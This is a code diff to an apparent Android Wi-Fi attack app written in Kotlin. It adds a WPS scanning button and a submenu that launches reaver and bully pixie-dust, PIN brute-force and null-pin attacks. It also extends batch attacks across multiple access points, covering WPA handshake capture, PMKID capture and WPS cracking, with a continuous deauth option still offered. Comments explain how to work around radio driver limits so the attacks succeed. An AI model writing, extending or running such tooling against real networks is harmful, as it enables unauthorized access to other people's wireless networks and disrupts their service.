@@ -75,6 +75,7 @@ class WifiFragment : Fragment() {
     private val selected = LinkedHashSet<String>()
     private lateinit var selectBtn: Button
     private lateinit var libraryBtn: Button
+    private lateinit var wpsBtn: Button
 
     /** Import a wordlist file the user picks into the app's wordlist store. */
     private val importWordlist = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
@@ -105,8 +106,14 @@ class WifiFragment : Fragment() {
         view.findViewById<Button>(R.id.wifi_refresh).setOnClickListener { refreshIfaces() }
         selectBtn = view.findViewById(R.id.wifi_select)
         libraryBtn = view.findViewById(R.id.wifi_library)
+        wpsBtn = view.findViewById(R.id.wifi_wps)
         selectBtn.setOnClickListener { onSelectBtn() }
         libraryBtn.setOnClickListener { if (selectMode) exitSelect() else openLibrary() }
+        wpsBtn.setOnClickListener {
+            val mon = monitorIface
+            if (mon == null) status.text = "Enable monitor mode first to scan for WPS."
+            else runWashScan(mon)
+        }
         monBtn.setOnClickListener { toggleMonitor() }
         scanBtn.setOnClickListener { if (scanning) stop() else start() }
         Thread { tools.ensure() }.start()
@@ -361,7 +368,9 @@ class WifiFragment : Fragment() {
             selected.isEmpty() -> "Cancel select"
             else -> "Run (${selected.size}) ▸"
         }
-        libraryBtn.text = if (selectMode) "Cancel" else "Saved · wordlists"
+        libraryBtn.text = if (selectMode) "Cancel" else "Saved"
+        // WPS scan isn't part of the multi-select flow — hide it so Run/Cancel pair cleanly.
+        wpsBtn.visibility = if (selectMode) View.GONE else View.VISIBLE
     }
 
     private fun chooseSequenceAttacks() {
@@ -397,7 +406,9 @@ class WifiFragment : Fragment() {
                 if (!running.get()) break
                 val isWpa = ap.enc.startsWith("WPA")
                 tools.appendLog(out, "\n==== ${ap.name()}  ${ap.bssid}  ${ap.protoLabel()} ====\n")
+                var ran = false
                 if (wpa && isWpa && running.get()) {
+                    ran = true
                     tools.appendLog(out, "-- WPA handshake --\n")
                     val ad = Airodump(tools, mon, ap.channel.takeIf { it > 0 }, ap.bssid, prefix = "hs")
                     ad.start()
@@ -413,11 +424,14 @@ class WifiFragment : Fragment() {
                     tools.appendLog(out, if (got == true) "handshake captured: ${ad.capPath()}\n" else "no handshake\n")
                 }
                 if (pmkid && isWpa && running.get()) {
+                    ran = true
                     tools.appendLog(out, "-- PMKID --\n"); tools.pmkid(mon, ap.bssid, ap.channel, secs = 20, out = out)
                 }
                 if (wps && ap.wps && running.get()) {
+                    ran = true
                     tools.appendLog(out, "-- WPS pixie-dust --\n"); tools.wps(mon, ap.bssid, ap.channel, pixie = true, secs = 120, out = out)
                 }
+                if (!ran) tools.appendLog(out, "skipped — not eligible for the chosen attack(s)\n")
             }
             "Sequence complete across ${targets.size} AP(s)."
         }
@@ -494,10 +508,13 @@ class WifiFragment : Fragment() {
             items += "Crack captured handshake (wordlist)" to false; run += { crack(ap) }
             items += "PMKID capture (clientless)" to true; run += { pmkid(mon, ap) }
         }
-        if (ap.wps) {
-            items += "WPS pixie-dust" to true; run += { wps(mon, ap, pixie = true) }
-            items += "WPS PIN brute (5 min)" to true; run += { wps(mon, ap, pixie = false) }
-            items += "WPS null-pin" to true; run += { wpsNull(mon, ap) }
+        // WPS attacks are offered for every WPA AP: on the internal qcacld radio wash can't
+        // reliably pre-detect WPS (passive IE parse), but reaver/bully associate actively and
+        // self-report whether the AP speaks WPS — so gating on detection would hide a working
+        // attack. A `★` marks APs wash did confirm as WPS.
+        if (isWpa) {
+            val tag = if (ap.wps) "★ WPS attacks (reaver / bully)…" else "WPS attacks (reaver / bully)…"
+            items += tag to false; run += { wpsMenu(mon, ap) }
         }
         items += "Deauth (continuous)" to true; run += { deauth(mon, ap) }
         MaterialAlertDialogBuilder(requireContext())
@@ -627,6 +644,74 @@ class WifiFragment : Fragment() {
     private fun wpsNull(iface: String, ap: Ap) =
         runAttackInline("WPS null-pin — ${ap.name()}", "wpsnull.log", kill = listOf("reaver")) { out, _ ->
             tools.wpsNull(iface, ap.bssid, ap.channel, out = out)
+        }
+
+    private fun bully(iface: String, ap: Ap, pixie: Boolean) =
+        runAttackInline(
+            (if (pixie) "bully pixie-dust" else "bully PIN brute") + " — ${ap.name()}",
+            "bully.log", kill = listOf("bully")
+        ) { out, _ ->
+            tools.wpsBully(iface, ap.bssid, ap.channel, pixie = pixie, secs = if (pixie) 180 else 300, out = out)
+        }
+
+    /**
+     * WPS attack submenu. reaver is the primary tool (what wifite2 defaults to, and the cleaner
+     * performer on this device's internal radio); bully is the fallback for when reaver stalls on
+     * rate-limiting / WPS lock. Both run on the internal qcacld monitor: reaver -F / bully -C
+     * ignore the false bad-FCS flag the driver stamps on every frame.
+     */
+    private fun wpsMenu(mon: String, ap: Ap) {
+        val labels = arrayOf(
+            "Pixie-dust — reaver (try first)",
+            "PIN brute — reaver",
+            "WPS null-pin — reaver",
+            "Pixie-dust — bully (fallback)",
+            "PIN brute — bully (fallback)",
+            "Confirm WPS with wash",
+        )
+        val acts = listOf<() -> Unit>(
+            { wps(mon, ap, pixie = true) },
+            { wps(mon, ap, pixie = false) },
+            { wpsNull(mon, ap) },
+            { bully(mon, ap, pixie = true) },
+            { bully(mon, ap, pixie = false) },
+            { washScanAp(mon, ap) },
+        )
+        MaterialAlertDialogBuilder(requireContext())
+            .setTitle("WPS — ${ap.name()}")
+            .setItems(labels) { _, i -> if (i == 5) acts[i]() else confirmActive(ap) { acts[i]() } }
+            .show()
+    }
+
+    /** Probe one AP for WPS with wash; if found, mark it WPS-eligible and reopen its menu so the
+     *  WPS attacks show. Works on the internal radio (wash -F ignores the false bad-FCS flag). */
+    private fun washScanAp(iface: String, ap: Ap) =
+        runAttackInline("WPS scan — ${ap.name()}", "wash.log", kill = listOf("wash")) { out, _ ->
+            val found = tools.washScan(iface, ap.channel, secs = 25, out = out)
+            val hit = found.firstOrNull { it.bssid.equals(ap.bssid, true) }
+            if (hit != null) {
+                ap.wps = true
+                list.post { if (isAdded) { render(); actions(ap) } }
+                "WPS ${hit.version} found${if (hit.locked) " (LOCKED)" else ""} — reopened menu with WPS attacks."
+            } else "No WPS advertised by ${ap.name()} in the probe window."
+        }
+
+    /** Full-band passive WPS discovery with wash; marks every WPS AP it finds eligible. */
+    private fun runWashScan(iface: String) =
+        runAttackInline("WPS scan (wash) — all channels", "wash.log", kill = listOf("wash")) { out, _ ->
+            val found = tools.washScan(iface, secs = 40, out = out)
+            if (found.isNotEmpty()) {
+                val byBssid = found.associateBy { it.bssid.uppercase() }
+                list.post {
+                    if (!isAdded) return@post
+                    aps.values.forEach { if (byBssid.containsKey(it.bssid.uppercase())) it.wps = true }
+                    render()
+                }
+            }
+            if (found.isEmpty()) "No WPS APs seen in the scan window."
+            else "WPS APs:\n" + found.joinToString("\n") {
+                "  ${it.bssid}  ch${it.channel}  v${it.version}${if (it.locked) "  LOCKED" else ""}"
+            } + "\n\n(marked eligible — long-press one for WPS attacks)"
         }
 
     private fun crack(ap: Ap) {
